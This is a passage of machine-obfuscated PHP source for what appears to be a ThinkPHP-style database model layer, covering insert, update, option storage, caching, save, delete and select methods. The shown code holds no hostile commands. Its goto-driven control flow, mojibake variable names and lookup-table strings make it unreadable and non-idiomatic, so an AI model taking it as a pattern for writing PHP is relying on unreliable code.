$F–ŒòŞ˜£ñ); } return $cÎŸ×âˆîÉ[$_SERVER[Õİõş][360] . $f¿…¾©Ä¹]; } public function insert($Fïâ–²‰ˆµ) { goto bİ‚çÓñô; e¼œÛÂ¯«¦: $Fïâ–²‰ˆµ[$a•Û‚ôˆÎ¬[106]] = time(); Model($this->modelType)->set($a•Û‚ôˆÎ¬[361], $C¤ñ§ÁºÍ‚, $this->optionType . $a•Û‚ôˆÎ¬[362]); Model($this->modelType)->set($a•Û‚ôˆÎ¬[360] . $C¤ñ§ÁºÍ‚, $Fïâ–²‰ˆµ, $this->optionType); goto fƒÉ“Ë¿ö¦; fƒÉ“Ë¿ö¦: return $C¤ñ§ÁºÍ‚; goto AË¤¯ª²; CÁ×È‘©Ë: $C¤ñ§ÁºÍ‚ = $C¤ñ§ÁºÍ‚ ? $C¤ñ§ÁºÍ‚ : 0; $Fïâ–²‰ˆµ[$a•Û‚ôˆÎ¬[363]] = ++$C¤ñ§ÁºÍ‚; $Fïâ–²‰ˆµ[$a•Û‚ôˆÎ¬[183]] = time(); goto e¼œÛÂ¯«¦; bİ‚çÓñô: $a•Û‚ôˆÎ¬ =& $_SERVER[Õİõş]; $Fïâ–²‰ˆµ = array_field_key($Fïâ–²‰ˆµ, $this->field); $C¤ñ§ÁºÍ‚ = Model($this->modelType)->get($a•Û‚ôˆÎ¬[361], $this->optionType . $a•Û‚ôˆÎ¬[362]); goto CÁ×È‘©Ë; AË¤¯ª²: } public function update($B‹öì¢ëŒÁ, $a¾’ôè™) { goto aŠ³œËËØŸ; B°ˆ¿ïô° : if (!$dï—ÎÜÇà) { return !1; } $a¾’ôè™ = array_merge($dï—ÎÜÇà, $a¾’ôè™); $a¾’ôè™[$eš­÷Ìí³ù[106]] = time(); goto B†œ’Æä”â; B†œ’Æä”â: return Model($this->modelType)->set($eš­÷Ìí³ù[360] . $B‹öì¢ëŒÁ, $a¾’ôè™, $this->optionType); goto cˆ˜÷ííÜ; aŠ³œËËØŸ: $eš­÷Ìí³ù =& $_SERVER[Õİõş]; $a¾’ôè™ = array_field_key($a¾’ôè™, $this->field); $dï—ÎÜÇà = $this->listData($B‹öì¢ëŒÁ); goto B°ˆ¿ïô° ; cˆ˜÷ííÜ: } public function remove($eÊÜ¬ø˜œ…) { return Model($this->modelType)->remove($_SERVER[Õİõş][360] . $eÊÜ¬ø˜œ…, $this->optionType); } public function clear() { $bÆ·®¸ØÈ =& $_SERVER[Õİõş]; Model($this->modelType)->remove($bÆ·®¸ØÈ[361], $this->optionType . $bÆ·®¸ØÈ[362]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($D–Åööù, $Aå ˆÇç‡) { if (!$Aå ˆÇç‡) { return !1; } $c‚æ­Èö† = $this->listData(); $c‚æ­Èö† = array_to_keyvalue($c‚æ­Èö†, $D–Åööù); return isset($c‚æ­Èö†[$Aå ˆÇç‡]) ? $c‚æ­Èö†[$Aå ˆÇç‡] : !1; } public function findByName($e›ºàíÕ´—) { return $this->findByKey($_SERVER[Õİõş][28], $e›ºàíÕ´—); } protected function resetData($cŸ³ÆóŞÑ) { $b…œ³áÎœÉ =& $_SERVER[Õİõş]; $cŸ³ÆóŞÑ = is_array($cŸ³ÆóŞÑ) ? $cŸ³ÆóŞÑ : array(); $A¨½‘ÜÏïÒ = array(); for ($eÌÛ’³†ß‘ = 0; $eÌÛ’³†ß‘ < count($cŸ³ÆóŞÑ); $eÌÛ’³†ß‘++) { $A¨½‘ÜÏïÒ[$b…œ³áÎœÉ[360] . $cŸ³ÆóŞÑ[$eÌÛ’³†ß‘][$b…œ³áÎœÉ[363]]] = $cŸ³ÆóŞÑ[$eÌÛ’³†ß‘]; } return Model($this->modelType)->set($A¨½‘ÜÏïÒ, !1, $this->optionType); } private function getAutoName($dëÑ„—¸×ª) { $b×îõ£—ĞÜ = array_to_keyvalue($this->listData(), $_SERVER[Õİõş][28]); if (!$b×îõ£—ĞÜ || !isset($b×îõ£—ĞÜ[$dëÑ„—¸×ª])) { return $dëÑ„—¸×ª; } for ($C‡œÊ¢ŠâÇ = 1; $C‡œÊ¢ŠâÇ < count($b×îõ£—ĞÜ); $C‡œÊ¢ŠâÇ++) { $dÜ‰Ì‚æÅÚ = $dëÑ„—¸×ª . "\50{$C‡œÊ¢ŠâÇ}\51"; if (!isset($b×îõ£—ĞÜ[$dÜ‰Ì‚æÅÚ])) { return $dÜ‰Ì‚æÅÚ; } } return $dÜ‰Ì‚æÅÚ; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($fîå‘ìñÈ = false, $B„‰‚«Ø÷ = '', $FèŒ´Òˆ†Ã = false) { goto F¬ÙÈîÖ‘; F¬ÙÈîÖ‘: $B«›ø®¸ê =& $_SERVER[Õİõş]; $C•‡ÂŠ÷ = $this->cacheGet($B„‰‚«Ø÷); $Eãº½±£« = $this->optionDefault($B„‰‚«Ø÷); goto d¶íäëøÔ­; Dñô®õª½İ: $this->cacheSet($B„‰‚«Ø÷, $C•‡ÂŠ÷); $C•‡ÂŠ÷ = array_merge($Eãº½±£«, $C•‡ÂŠ÷); return $fîå‘ìñÈ ? $C•‡ÂŠ÷[$fîå‘ìñÈ] : $C•‡ÂŠ÷; goto dáºåÃ–å; fè¸¸®ŸÎ©: $C•‡ÂŠ÷ = $this->where($fÕß£¾Úå¸)->select(); $C•‡ÂŠ÷ = array_to_keyvalue($C•‡ÂŠ÷, $B«›ø®¸ê[89], $B«›ø®¸ê[355]); foreach ($C•‡ÂŠ÷ as $c˜¤…¦Ã› => $Fî„ª§î‚¤) { if ($FèŒ´Òˆ†Ã || in_array($c˜¤…¦Ã›, $this->jsonField)) { $C•‡ÂŠ÷[$c˜¤…¦Ã›] = json_decode($Fî„ª§î‚¤, !0); } } goto Dñô®õª½İ; d¶íäëøÔ­: $Eãº½±£« = is_array($Eãº½±£«) ? $Eãº½±£« : array(); if (is_array($C•‡ÂŠ÷)) { $C•‡ÂŠ÷ = array_merge($Eãº½±£«, $C•‡ÂŠ÷); return $fîå‘ìñÈ ? isset($C•‡ÂŠ÷[$fîå‘ìñÈ]) ? $C•‡ÂŠ÷[$fîå‘ìñÈ] : null : $C•‡ÂŠ÷; } $fÕß£¾Úå¸ = $this->filterWhere(array($B«›ø®¸ê[29] => $B„‰‚«Ø÷)); goto fè¸¸®ŸÎ©; dáºåÃ–å: } public function set($Aˆ¤çªÛÒ, $BÎºËÉãê· = false, $B¼¯¡ì¢®Ä = '') { goto c²˜¥É‰Øµ; CòˆË³öÄõ: return $this->addAll($EÁÇµî“¶, array(), !0); goto e‡í“¸«Ç; c…–Û®¼†ª: $bˆš¦¶ù‡  = is_array($Aˆ¤çªÛÒ) ? $Aˆ¤çªÛÒ : array($Aˆ¤çªÛÒ => $BÎºËÉãê·); foreach ($bˆš¦¶ù‡  as $BÍ ŸªÍŠ® => $eè‡ã©£Œù) { if (is_array($eè‡ã©£Œù)) { $eè‡ã©£Œù = json_encode_force($eè‡ã©£Œù); } $this->checkLength($eè‡ã©£Œù, !1, $this->tableName . $c—ö†Šœë©[4] . $Aˆ¤çªÛÒ); $eè‡ã©£Œù = self::textEncode($eè‡ã©£Œù); $bˆš¦¶ù‡  = array($c—ö†Šœë©[29] => $B¼¯¡ì¢®Ä, $c—ö†Šœë©[89] => $BÍ ŸªÍŠ®, $c—ö†Šœë©[355] => $eè‡ã©£Œù); $EÁÇµî“¶[] = $this->filterWhere($bˆš¦¶ù‡ ); } if (!$EÁÇµî“¶) { return !0; } goto CòˆË³öÄõ; c²˜¥É‰Øµ: $c—ö†Šœë© =& $_SERVER[Õİõş]; $this->cacheRemove($B¼¯¡ì¢®Ä); $EÁÇµî“¶ = array(); goto c…–Û®¼†ª; e‡í“¸«Ç: } protected function optionDefault($Cİõœ³‹›— = '') { return !1; } public function setDeep($cİ°‡š‚À¾, $Dº¿ÚôÆí = false, $FööŞ—•§Ø = '') { $F´†š»µ = explode($_SERVER[Õİõş][91], $cİ°‡š‚À¾); $AøÀóÛÛÔ = $this->get(); array_set_value($AøÀóÛÛÔ, $cİ°‡š‚À¾, $Dº¿ÚôÆí); $this->set($F´†š»µ[0], $AøÀóÛÛÔ[$F´†š»µ[0]], $FööŞ—•§Ø); } public function remove($dë½±Û©ëù, $bÌ±İ™ø‘Ş = '') { $f¶¹èô¤„ƒ =& $_SERVER[Õİõş]; $this->cacheRemove($bÌ±İ™ø‘Ş); $C”ÕÆ•›Áù = $this->filterWhere(array($f¶¹èô¤„ƒ[89] => $dë½±Û©ëù, $f¶¹èô¤„ƒ[29] => $bÌ±İ™ø‘Ş)); if (is_null($dë½±Û©ëù)) { unset($C”ÕÆ•›Áù[$f¶¹èô¤„ƒ[89]]); } return $this->where($C”ÕÆ•›Áù)->delete(); } public function cacheSet($A²¬µ…à¼, $eëÆÔ¸ëİ = false) { return Cache::set($this->cacheKey($A²¬µ…à¼), $eëÆÔ¸ëİ); } public function cacheGet($Ağ”—ôî‹š) { return Cache::get($this->cacheKey($Ağ”—ôî‹š)); } public function cacheRemove($eÕÎàÔ­à„) { return Cache::remove($this->cacheKey($eÕÎàÔ­à„)); } protected function filterWhere($E¥°å—®–²) { return $E¥°å—®–²; } protected function cacheKey($d¤¡Ó÷Íì) { return $d¤¡Ó÷Íì; } } goto eŠ‡êçâ­Ó; AíÄ˜œ„…„: define($_SERVER[Õİõş][226], 0); define($_SERVER[Õİõş][227], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\154\x65", "\157\162\x64\x65\162", "\x61\154\x69\141\x73", "\x68\141\166\151\156\147", "\147\162\x6f\x75\160", "\x6c\x6f\143\153", "\144\151\x73\164\151\156\143\164", "\x61\165\x74\157", "\x66\x69\154\164\145\x72", "\x76\x61\x6c\x69\x64\141\164\x65", "\x72\145\163\165\x6c\164", "\142\151\x6e\x64", "\x74\157\x6b\x65\156"); public function __construct($bÊ›¤ë¢¾à = '', $C©œÎÛ” = '', $F‰ğé‹…¯Ò = '') { $E…²ë£´»£ =& $_SERVER[Õİõş]; $this->_initialize(); if (!empty($bÊ›¤ë¢¾à)) { if (strpos($bÊ›¤ë¢¾à, $E…²ë£´»£[91])) { list($this->dbName, $this->name) = explode($E…²ë£´»£[91], $bÊ›¤ë¢¾à); } else { $this->name = $bÊ›¤ë¢¾à; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($C©œÎÛ”)) { $this->tablePrefix = $E…²ë£´»£[33]; } elseif ($E…²ë£´»£[33] != $C©œÎÛ”) { $this->tablePrefix = $C©œÎÛ”; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($E…²ë£´»£[228]); } $this->db(0, empty($this->connection) ? $F‰ğé‹…¯Ò : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $A©óÆ–İ‘ =& $_SERVER[Õİõş]; if (empty($this->fields)) { if (think_config($A©óÆ–İ‘[229])) { $c‚Ğ†İíô¼ = $this->dbName ? $this->dbName : think_config($A©óÆ–İ‘[230]); $c–‹êôÜÜ = think_var_cache($A©óÆ–İ‘[231] . strtolower(get_path_this($c‚Ğ†İíô¼) . $A©óÆ–İ‘[91] . $this->name)); if ($c–‹êôÜÜ) { $a†¥è†ì…é = think_config($A©óÆ–İ‘[232]); if (empty($a†¥è†ì…é) || $c–‹êôÜÜ[$A©óÆ–İ‘[233]] == $a†¥è†ì…é) { $this->fields = $c–‹êôÜÜ; return; } } } $this->flush(); } } public function flush() { goto Bæ—ÎÙŠ¥ø; Bæ—ÎÙŠ¥ø: $c¥£­‰âÌì =& $_SERVER[Õİõş]; $this->db->setModel($this->name); $eéäí¿‘Õ« = $this->db->getFields($this->getTableName()); goto F„£¾†âÇÍ; F„£¾†âÇÍ: if (!$eéäí¿‘Õ«) { return !1; } $this->fields = array_keys($eéäí¿‘Õ«); $this->fields[$c¥£­‰âÌì[234]] = !1; goto DÃ½…·’¥—; DÃ½…·’¥—: foreach ($eéäí¿‘Õ« as $d±˜æ×»•î => $FÊ²«‘¯Û) { $DÓˆÚ÷Ä³É[$d±˜æ×»•î] = $FÊ²«‘¯Û[$c¥£­‰âÌì[29]]; if ($FÊ²«‘¯Û[$c¥£­‰âÌì[36]]) { $this->fields[$c¥£­‰âÌì[235]] = $d±˜æ×»•î; if ($FÊ²«‘¯Û[$c¥£­‰âÌì[39]]) { $this->fields[$c¥£­‰âÌì[234]] = !0; } } } $this->fields[$c¥£­‰âÌì[236]] = $DÓˆÚ÷Ä³É; if (think_config($c¥£­‰âÌì[232])) { $this->fields[$c¥£­‰âÌì[233]] = think_config($c¥£­‰âÌì[232]); } goto aå’Ú©Õáø; aå’Ú©Õáø: if (think_config($c¥£­‰âÌì[229])) { $C…Ôá“Êáº = $this->dbName ? $this->dbName : think_config($c¥£­‰âÌì[230]); think_var_cache($c¥£­‰âÌì[231] . strtolower(get_path_this($C…Ôá“Êáº) . $c¥£­‰âÌì[91] . $this->name), $this->fields); } goto e²Áß„Šá; e²Áß„Šá: } public function switchModel($f Ò‰ğ«–‚, $b„•Ø±‚à = array()) { $FÃßÂ…Ñ˜ =& $_SERVER[Õİõş]; $fÓØ«îÏâŠ = ucwords(strtolower($f Ò‰ğ«–‚)) . $FÃßÂ…Ñ˜[237]; if (!class_exists($fÓØ«îÏâŠ)) { think_exception($fÓØ«îÏâŠ . think_lang($FÃßÂ…Ñ˜[238])); } $this->_extModel = new $fÓØ«îÏâŠ($this->name); if (!empty($b„•Ø±‚à)) { foreach ($b„•Ø±‚à as $Dñ¾‹Ê«äÒ) { $this->_extModel->setProperty($Dñ¾‹Ê«äÒ, $this->{$Dñ¾‹Ê«äÒ}); } } return $this->_extModel; } public function __set($Fˆƒ¬Ùãß, $B†„Ÿçğß) { $this->data[$Fˆƒ¬Ùãß] = $B†„Ÿçğß; } public function __get($A®ÆºÙö¦) { return isset($this->data[$A®ÆºÙö¦]) ? $this->data[$A®ÆºÙö¦] : null; } public function __isset($Aª‰±óÃø¹) { return isset($this->data[$Aª‰±óÃø¹]); } public function __unset($e‘å’Ú³Ôø) { unset($this->data[$e‘å’Ú³Ôø]); } public function __call($D¸Çæ±ò‡, $bè¬‹Íà”æ) { $A¤æã´­Ò =& $_SERVER[Õİõş]; if (in_array(strtolower($D¸Çæ±ò‡), $this->methods, !0)) { $this->options[strtolower($D¸Çæ±ò‡)] = $bè¬‹Íà”æ[0]; return $this; } elseif (in_array(strtolower($D¸Çæ±ò‡), array($A¤æã´­Ò[239], $A¤æã´­Ò[240], $A¤æã´­Ò[241], $A¤æã´­Ò[242], $A¤æã´­Ò[243]), !0)) { $C“†­èóØ‰ = isset($bè¬‹Íà”æ[0]) ? $bè¬‹Íà”æ[0] : $A¤æã´­Ò[172]; $C“†­èóØ‰ = $this->db->parseKey($C“†­èóØ‰); return $this->getField(strtoupper($D¸Çæ±ò‡) . $A¤æã´­Ò[244] . $C“†­èóØ‰ . $A¤æã´­Ò[245] . $D¸Çæ±ò‡, $A¤æã´­Ò[239]); } elseif (strtolower(substr($D¸Çæ±ò‡, 0, 5)) == $A¤æã´­Ò[246]) { $C“†­èóØ‰ = think_parse_name(substr($D¸Çæ±ò‡, 5)); $Bõ™¸ŞÊÎ”[$C“†­èóØ‰] = $bè¬‹Íà”æ[0]; return $this->where($Bõ™¸ŞÊÎ”)->find(); } elseif (strtolower(substr($D¸Çæ±ò‡, 0, 10)) == $A¤æã´­Ò[247]) { $aô¤³Ÿ«Ö‘ = think_parse_name(substr($D¸Çæ±ò‡, 10)); $Bõ™¸ŞÊÎ”[$aô¤³Ÿ«Ö‘] = $bè¬‹Íà”æ[0]; return $this->where($Bõ™¸ŞÊÎ”)->getField($bè¬‹Íà”æ[1]); } elseif (isset($this->_scope[$D¸Çæ±ò‡])) { return $this->scope($D¸Çæ±ò‡, $bè¬‹Íà”æ[0]); } elseif (method_exists($this, $D¸Çæ±ò‡)) { array_unshift($bè¬‹Íà”æ, $D¸Çæ±ò‡); return call_user_func_array(array($this, $A¤æã´­Ò[248]), $bè¬‹Íà”æ); } else { return call_user_func_array(array(parent, $D¸Çæ±ò‡), $bè¬‹Íà”æ); } } protected function call() { goto c³«¿¦…’Æ; C™£ÖÁ£İ: $F”¶›Ùá« = $eÚë›ôšé; if (is_array($eÚë›ôšé)) { $F”¶›Ùá« = $eÚë›ôšé[1]; $eÚë›ôšé = $eÚë›ôšé[0]; } $A‘à¬‚Åƒ = count($b“È‚ë±äÊ) - 1; goto DËÖè§ó‡¿; DËÖè§ó‡¿: if (isset($b“È‚ë±äÊ[$A‘à¬‚Åƒ]) && $b“È‚ë±äÊ[$A‘à¬‚Åƒ] === $eÚë›ôšé) { think_exception(__CLASS__ . $A®¹¤–[4] . $eÚë›ôšé . think_lang($A®¹¤–[249])); return; } $b“È‚ë±äÊ[] = $eÚë›ôšé; if (method_exists($this, $A®¹¤–[250])) { $e¼¾–¸à³ˆ = call_user_func_array(array($this, $A®¹¤–[251]), array($F”¶›Ùá«, $b“È‚ë±äÊ)); if (!is_null($e¼¾–¸à³ˆ) && $e¼¾–¸à³ˆ !== !1) { return $e¼¾–¸à³ˆ; } } goto DÁŒÜÙîì; DÁŒÜÙîì: $B®×µÇ…‚¾ = call_user_func_array(array($this, $eÚë›ôšé), $b“È‚ë±äÊ); if (method_exists($this, $A®¹¤–[252])) { $e¼¾–¸à³ˆ = call_user_func_array(array($this, $A®¹¤–[253]), array($F”¶›Ùá«, $b“È‚ë±äÊ, $B®×µÇ…‚¾)); if ($e¼¾–¸à³ˆ) { return $e¼¾–¸à³ˆ; } } return $B®×µÇ…‚¾; goto CŒ³Ó´î¨; c³«¿¦…’Æ: $A®¹¤– =& $_SERVER[Õİõş]; $b“È‚ë±äÊ = func_get_args(); $eÚë›ôšé = array_shift($b“È‚ë±äÊ); goto C™£ÖÁ£İ; CŒ³Ó´î¨: } protected function _initialize() { } protected function _facade($Eà•Şø‰·œ) { $e«Ôçâí¶ =& $_SERVER[Õİõş]; if (!empty($this->fields)) { foreach ($Eà•Şø‰·œ as $CëÇğŠœ±Ÿ => $F‘Ã¶ä“¥) { if (!in_array($CëÇğŠœ±Ÿ, $this->fields, !0)) { unset($Eà•Şø‰·œ[$CëÇğŠœ±Ÿ]); } elseif (is_scalar($F‘Ã¶ä“¥)) { $this->_parseType($Eà•Şø‰·œ, $CëÇğŠœ±Ÿ); } } } if (!empty($this->options[$e«Ôçâí¶[254]])) { $Eà•Şø‰·œ = array_map($this->options[$e«Ôçâí¶[254]], $Eà•Şø‰·œ); unset($this->options[$e«Ôçâí¶[254]]); } $this->_beforeWrite($Eà•Şø‰·œ); return $Eà•Şø‰·œ; } protected function _beforeWrite(&$e°˜æÍä¹) { } public function add($c˜äªá÷†• = '', $Aìƒ¬ç¦©Õ = array(), $FŒ¥–ëåÇ¹ = false) { goto c°Ä ¸†áê; F–ßğ’ÍåÌ: return $C¼‡õ“µ®¼; goto d“ˆÍ’•; Dø¸²Åƒ‹‡: if (!1 === $this->_beforeInsert($c˜äªá÷†•, $Aìƒ¬ç¦©Õ)) { return !1; } $C¼‡õ“µ®¼ = $this->db->insert($c˜äªá÷†•, $Aìƒ¬ç¦©Õ, $FŒ¥–ëåÇ¹); if (!1 !== $C¼‡õ“µ®¼) { $cİîİ¢»ß = $this->getLastInsID(); if ($cİîİ¢»ß) { $c˜äªá÷†•[$this->getPk()] = $cİîİ¢»ß; $this->_after_insert($c˜äªá÷†•, $Aìƒ¬ç¦©Õ); return $cİîİ¢»ß; } $this->_after_insert($c˜äªá÷†•, $Aìƒ¬ç¦©Õ); } goto F–ßğ’ÍåÌ; c°Ä ¸†áê: if (empty($c˜äªá÷†•)) { if (!empty($this->data)) { $c˜äªá÷†• = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Õİõş][255]); return !1; } } $Aìƒ¬ç¦©Õ = $this->_parseOptions($Aìƒ¬ç¦©Õ); $c˜äªá÷†• = $this->_facade($c˜äªá÷†•); goto Dø¸²Åƒ‹‡; d“ˆÍ’•: } protected function _beforeInsert(&$D§³ Î‘Ñø, $D³ÃÎ‘˜«) { } protected function _after_insert($A­‚±Ú´–¯, $Cãî”Ü­©) { } public function addAll($e‚óÜ¡õÀˆ, $f˜£ò¦½ = array(), $DÑƒãß¾É = false) { goto eÛ¶‡­¸ß±; F”ØÓŠ»: foreach ($e‚óÜ¡õÀˆ as $aÕŠ‚ì• => $b×Áåˆ­¿¯) { $e‚óÜ¡õÀˆ[$aÕŠ‚ì•] = $this->_facade($b×Áåˆ­¿¯); } if (method_exists($this->db, $eÒ¥ÉÑ—Ï[256])) { $E˜¯ËÎ£„ä = $this->db->insertAll($e‚óÜ¡õÀˆ, $f˜£ò¦½, $DÑƒãß¾É); } else { $this->startTrans(); foreach ($e‚óÜ¡õÀˆ as $aÕŠ‚ì• => $b×Áåˆ­¿¯) { $E˜¯ËÎ£„ä = $this->db->insert($b×Áåˆ­¿¯, $f˜£ò¦½, $DÑƒãß¾É); } $this->commit(); } if (!1 !== $E˜¯ËÎ£„ä) { $e¬Á‹áäÇ¤ = $this->getLastInsID(); if ($e¬Á‹áäÇ¤) { return $e¬Á‹áäÇ¤; } } goto AÁ©ï‰ÊŞ; AÁ©ï‰ÊŞ: return $E˜¯ËÎ£„ä; goto F„µ¨¨˜¼; eÛ¶‡­¸ß±: $eÒ¥ÉÑ—Ï =& $_SERVER[Õİõş]; if (empty($e‚óÜ¡õÀˆ)) { $this->error = think_lang($eÒ¥ÉÑ—Ï[255]); return !1; } $f˜£ò¦½ = $this->_parseOptions($f˜£ò¦½); goto F”ØÓŠ»; F„µ¨¨˜¼: } public function selectAdd($cÏÔ ØáÅì = '', $D‚Ëµ¾ÑË® = '', $fš…ŞÑòæ = array()) { $E¡ø’ƒÆµ• =& $_SERVER[Õİõş]; $fš…ŞÑòæ = $this->_parseOptions($fš…ŞÑòæ); if (!1 === ($CÃàªƒ…¤ = $this->db->selectInsert($cÏÔ ØáÅì ? $cÏÔ ØáÅì : $fš…ŞÑòæ[$E¡ø’ƒÆµ•[257]], $D‚Ëµ¾ÑË® ? $D‚Ëµ¾ÑË® : $this->getTableName(), $fš…ŞÑòæ))) { $this->error = think_lang($E¡ø’ƒÆµ•[258]); return !1; } else { return $CÃàªƒ…¤; } } public function save($DÌ½Æà®‘ = '', $f­îÙ‡Ù™ó = array()) { goto fŸêæ–™‰; fŸêæ–™‰: $bßå·è…  =& $_SERVER[Õİõş]; if (empty($DÌ½Æà®‘)) { if (!empty($this->data)) { $DÌ½Æà®‘ = $this->data; $this->data = array(); } else { $this->error = think_lang($bßå·è… [255]); return !1; } } $DÌ½Æà®‘ = $this->_facade($DÌ½Æà®‘); goto b‡²ó·Îõ¾; b‡²ó·Îõ¾: $f­îÙ‡Ù™ó = $this->_parseOptions($f­îÙ‡Ù™ó); $cÑÒÒå‡ë¿ = $this->getPk(); if (!isset($f­îÙ‡Ù™ó[$bßå·è… [259]])) { if (isset($DÌ½Æà®‘[$cÑÒÒå‡ë¿])) { $EÜ„‡×£¥Î[$cÑÒÒå‡ë¿] = $DÌ½Æà®‘[$cÑÒÒå‡ë¿]; $f­îÙ‡Ù™ó[$bßå·è… [259]] = $EÜ„‡×£¥Î; unset($DÌ½Æà®‘[$cÑÒÒå‡ë¿]); } else { $this->error = think_lang($bßå·è… [258]); return !1; } } goto c÷Œ‚÷ˆ™; c÷Œ‚÷ˆ™: if (is_array($f­îÙ‡Ù™ó[$bßå·è… [259]]) && isset($f­îÙ‡Ù™ó[$bßå·è… [259]][$cÑÒÒå‡ë¿])) { $a—±÷Ş‹­™ = $f­îÙ‡Ù™ó[$bßå·è… [259]][$cÑÒÒå‡ë¿]; } if (!1 === $this->_beforeUpdate($DÌ½Æà®‘, $f­îÙ‡Ù™ó)) { return !1; } $CÌ‹³ÔÕ†‡ = $this->db->update($DÌ½Æà®‘, $f­îÙ‡Ù™ó); goto bÚòöæôé; bÚòöæôé: if (!1 !== $CÌ‹³ÔÕ†‡) { if (isset($a—±÷Ş‹­™)) { $DÌ½Æà®‘[$cÑÒÒå‡ë¿] = $a—±÷Ş‹­™; } $this->_afterUpdate($DÌ½Æà®‘, $f­îÙ‡Ù™ó); } return $CÌ‹³ÔÕ†‡; goto cª‚„‡Æ‰Í; cª‚„‡Æ‰Í: } protected function _beforeUpdate(&$Fàîš×±¢ˆ, $fšßåÙğ°ã) { } protected function _afterUpdate($dÇŞôİÌŞ, $còÑŠ«òˆÎ) { } public function delete($Dİ„éª¥Öœ = array()) { goto AÁ‰†øäêã; aä¾–˜Èˆ‚: if (is_numeric($Dİ„éª¥Öœ) || is_string($Dİ„éª¥Öœ)) { if (strpos($Dİ„éª¥Öœ, $dÃÂ”Š¶É[47])) { $fÆï¨Â‹©ª[$A­½õ†İ¿¬] = array($dÃÂ”Š¶É[260], $Dİ„éª¥Öœ); } else { $fÆï¨Â‹©ª[$A­½õ†İ¿¬] = $Dİ„éª¥Öœ; } $this->options[$dÃÂ”Š¶É[259]] = $fÆï¨Â‹©ª; } $Dİ„éª¥Öœ = $this->_parseOptions(); if (is_array($Dİ„éª¥Öœ[$dÃÂ”Š¶É[259]]) && isset($Dİ„éª¥Öœ[$dÃÂ”Š¶É[259]][$A­½õ†İ¿¬])) { $BåØæÛÖ× = $Dİ„éª¥Öœ[$dÃÂ”Š¶É[259]][$A­½õ†İ¿¬]; } goto dëÌœ‰š‰; AÁ‰†øäêã: $dÃÂ”Š¶É =& $_SERVER[Õİõş]; if (empty($Dİ„éª¥Öœ) && empty($this->options[$dÃÂ”Š¶É[259]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $A­½õ†İ¿¬ = $this->getPk(); goto aä¾–˜Èˆ‚; dëÌœ‰š‰: $bµ“…‰©Ì‚ = $this->db->delete($Dİ„éª¥Öœ); if (!1 !== $bµ“…‰©Ì‚) { $f˜“¿ÖŠË† = array(); if (isset($BåØæÛÖ×)) { $f˜“¿ÖŠË†[$A­½õ†İ¿¬] = $BåØæÛÖ×; } $this->_after_delete($f˜“¿ÖŠË†, $Dİ„éª¥Öœ); } return $bµ“…‰©Ì‚; goto B…õéƒİ‰Â; B…õéƒİ‰Â: } protected function _after_delete($bÕéªÚÜùŠ, $fÁë•¶âÛ) { } public function select($CêÀº’ëƒ = array()) { goto f®šËßõõë; f®šËßõõë: $EàÇ˜¡õ½é =& $_SERVER[Õİõş]; if (is_string($CêÀº’ëƒ) || is_numeric($CêÀº’ëƒ)) { $B››Ó»˜³ = $this->getPk(); if (strpos($CêÀº’ëƒ, $EàÇ˜¡õ½é[47])) { $B“äİÕ·×«[$B››Ó»˜³] = array($EàÇ˜¡õ½é[260], $CêÀº’ëƒ); } else { $B“äİÕ·×«[$B››Ó»˜³] = $CêÀº’ëƒ; } $this->options[$EàÇ˜¡õ½é[259]] = $B“äİÕ·×«; } elseif (!1 === $CêÀº’ëƒ) { $CêÀº’ëƒ = $this->_parseOptions(); return $EàÇ˜¡õ½é[261] . $this->db->buildSelectSql($CêÀº’ëƒ) . $EàÇ˜¡õ½é[262]; } $CêÀº’ëƒ = $this->_parseOptions(); goto BÄ†Å…Ñ”É; BÄ†Å…Ñ”É: $CĞ·ö¸¬­ = $this->db->select($CêÀº’ëƒ); if (!1 === $CĞ·ö¸¬­) { return !1; } if (empty($CĞ·ö¸¬­)) { return null; } goto d˜ŠÏÊèî; d˜ŠÏÊèî: $this->_afterSelect($CĞ·ö¸¬­, $CêÀº’ëƒ); return $CĞ·ö¸¬­; goto c³ÖŒ™ÃßŸ; c³ÖŒ™ÃßŸ: } protected function _afterSelect(&$cÕÊŸ§¢­ô, $B¦¥ÓãÕñ) { } public function buildSql($E§Ã”œ††ñ = array()) { $FºãœìË¬¢ =& $_SERVER[Õİõş]; $E§Ã”œ††ñ = $this->_parseOptions($E§Ã”œ††ñ); return $FºãœìË¬¢[261] . $this->db->buildSelectSql($E§Ã”œ††ñ) . $FºãœìË¬¢[262]; } public function optionsValue($d¦ÏÏ†é»† = null) { if (is_null($d¦ÏÏ†é»†)) { return $this->options; } elseif (is_array($d¦ÏÏ†é»†)) { $this->options = array_merge($this->options, $d¦ÏÏ†é»†); } } protected function _parseOptions($d³‘™ØÅ×İ = array()) { goto bÙùÀ‡’Ú; b²ÉÎÈÎå„: if (!isset($d³‘™ØÅ×İ[$FĞø¾ŞŒÅÚ[263]])) { $d³‘™ØÅ×İ[$FĞø¾ŞŒÅÚ[263]] = $this->getTableName(); $DÉÏã¦îÁ = $this->fields; } else { $DÉÏã¦îÁ = $this->getDbFields(); } if (!empty($d³‘™ØÅ×İ[$FĞø¾ŞŒÅÚ[264]])) { $d³‘™ØÅ×İ[$FĞø¾ŞŒÅÚ[263]] .= $FĞø¾ŞŒÅÚ[50] . $d³‘™ØÅ×İ[$FĞø¾ŞŒÅÚ[264]]; } $d³‘™ØÅ×İ[$FĞø¾ŞŒÅÚ[265]] = $this->name; goto fÇ¼î«ñˆã; bÙùÀ‡’Ú: $FĞø¾ŞŒÅÚ =& $_SERVER[Õİõş]; if (is_array($d³‘™ØÅ×İ)) { $d³‘™ØÅ×İ = array_merge($this->options, $d³‘™ØÅ×İ); } $this->options = array(); goto 